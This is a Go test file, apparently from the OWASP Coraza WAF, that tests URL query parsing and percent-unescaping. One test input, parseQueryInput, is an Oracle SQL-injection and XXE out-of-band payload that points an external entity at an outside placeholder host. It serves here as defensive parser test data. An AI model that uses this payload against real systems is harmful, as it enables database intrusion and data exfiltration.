// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

package url

import (
	"reflect"
	"testing"
)

var parseQueryInput = `var=EmptyValue'||(select extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % awpsd SYSTEM "http://0cddnr5evws01h2bfzn5zd0cm3sxvrjv7oufi4.example'||'foo.bar/">%awpsd;`

func TestUrlPayloads(t *testing.T) {
	values := map[string][]string{}
	EachQueryValue(parseQueryInput, '&', func(key, value string) bool {
		values[key] = append(values[key], value)
		return true
	})
	if len(values["var"]) == 0 {
		t.Error("var is empty")
	}
}

func BenchmarkEachQueryValue(b *testing.B) {
	for i := 0; i < b.N; i++ {
		EachQueryValue(parseQueryInput, '&', func(key, value string) bool { return true })
	}
}

var queryUnescapePayloads = map[string]string{
	"sample":    "sample",
	"s%20ample": "s ample",
	"s+ample":   "s ample",
	"s%2fample": "s/ample",
	"s% ample":  "s% ample",  // non-strict sample
	"s%ssample": "s%ssample", // non-strict sample
	"s%00ample": "s\x00ample",
	"%7B%%7d":   "{%}",
	"%7B+%+%7d": "{ % }",
}

func TestQueryUnescape(t *testing.T) {
	for k, v := range queryUnescapePayloads {
		if out := queryUnescape(k); out != v {
			t.Errorf("Error parsing %q, got %q and expected %q", k, out, v)
		}
	}
}

func BenchmarkQueryUnescape(b *testing.B) {
	for i := 0; i < b.N; i++ {
		for k := range queryUnescapePayloads {
			queryUnescape(k)
		}
	}
}

// TestEachQueryValueStopsOnFalse asserts that returning false from the callback
// ends the walk. Callers rely on it to stop decoding at an argument limit, so
// without it the remaining arguments are decoded and thrown away.
func TestEachQueryValueStopsOnFalse(t *testing.T) {
	var seen []string
	EachQueryValue("a=1&b=2&c=3&d=4", '&', func(key, value string) bool {
		seen = append(seen, key+"="+value)
		return len(seen) < 2
	})
	if want, have := []string{"a=1", "b=2"}, seen; !reflect.DeepEqual(want, have) {
		t.Errorf("walk did not stop on false, want %v, have %v", want, have)
	}
}
